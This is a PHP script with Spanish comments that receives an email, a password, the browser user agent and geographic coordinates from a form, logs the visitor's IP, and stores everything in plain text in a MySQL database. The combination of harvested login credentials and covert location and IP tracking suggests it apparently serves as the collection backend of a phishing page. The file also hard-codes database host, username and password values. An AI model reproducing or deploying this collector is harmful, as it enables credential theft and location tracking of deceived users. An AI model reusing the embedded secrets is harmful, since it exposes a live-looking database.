<?php
header('Content-Type: application/json'); // La respuesta será en formato JSON

// --- Datos de la base de datos ---
$db_host = "mysql-chavezcanul.alwaysdata.net";
$db_user = "415767_";
$db_pass = "chavezcanul";
// IMPORTANTE: Confirma el nombre de tu base de datos en alwaysdata.net.
// Podría ser '415767_datos' o 'chavezcanul_datos', o algo que hayas definido.
// Reemplaza 'TU_NOMBRE_DE_BASE_DE_DATOS_AQUI' con el nombre correcto.
$db_name = "chavezcanul_datos"; // EJEMPLO: '415767_minuevabase' o similar. ¡VERIFICA ESTO!
$db_table = "datos";

// --- Recibir datos del formulario (POST) ---
$correo = isset($_POST['correo']) ? $_POST['correo'] : null;
$contrasena = isset($_POST['contrasena']) ? $_POST['contrasena'] : null; // ¡PELIGRO! Contraseña en texto plano.
$user_agent = isset($_POST['user_agent']) ? $_POST['user_agent'] : null;
$latitud = isset($_POST['latitud']) ? (float)$_POST['latitud'] : null; // Convertir a float o null
$longitud = isset($_POST['longitud']) ? (float)$_POST['longitud'] : null; // Convertir a float o null

// --- Obtener IP del cliente ---
$ip_cliente = $_SERVER['REMOTE_ADDR'];

// --- Validación básica ---
if (empty($correo) || empty($contrasena) || empty($user_agent)) {
    echo json_encode(['success' => false, 'message' => 'Error: Correo, contraseña y user agent son obligatorios.']);
    exit;
}

// --- Conexión a la base de datos MySQL ---
$conn = new mysqli($db_host, $db_user, $db_pass, $db_name);

// Verificar si la conexión falló
if ($conn->connect_error) {
    // No muestres errores detallados de DB al usuario en producción. Loguéalos.
    error_log("Error de conexión DB: " . $conn->connect_error . " (Host: $db_host, User: $db_user, DBName: $db_name)");
    echo json_encode(['success' => false, 'message' => 'Error al conectar con el servidor de datos. Intenta más tarde.']);
    exit;
}

// --- Preparar la sentencia SQL para insertar datos (previene inyección SQL) ---
// Columnas: correo, contrasena, user_agent, ip_cliente, latitud, longitud
$sql = "INSERT INTO $db_table (correo, contrasena, user_agent, ip_cliente, latitud, longitud) VALUES (?, ?, ?, ?, ?, ?)";

$stmt = $conn->prepare($sql);

if ($stmt === false) {
    error_log("Error al preparar la sentencia SQL: " . $conn->error);
    echo json_encode(['success' => false, 'message' => 'Error interno del servidor al procesar la solicitud.']);
    exit;
}

// Vincular los parámetros. 's' = string, 'd' = double (para lat/long)
// PHP null se insertará como SQL NULL si la columna lo permite.
$stmt->bind_param("ssssdd", $correo, $contrasena, $user_agent, $ip_cliente, $latitud, $longitud);

// --- Ejecutar la sentencia ---
if ($stmt->execute()) {
    echo json_encode(['success' => true, 'message' => '¡Datos guardados correctamente!']);
} else {
    error_log("Error al ejecutar la sentencia: " . $stmt->error);
    echo json_encode(['success' => false, 'message' => 'Error al guardar los datos. Intenta de nuevo.']);
}

// --- Cerrar la sentencia y la conexión ---
$stmt->close();
$conn->close();

?>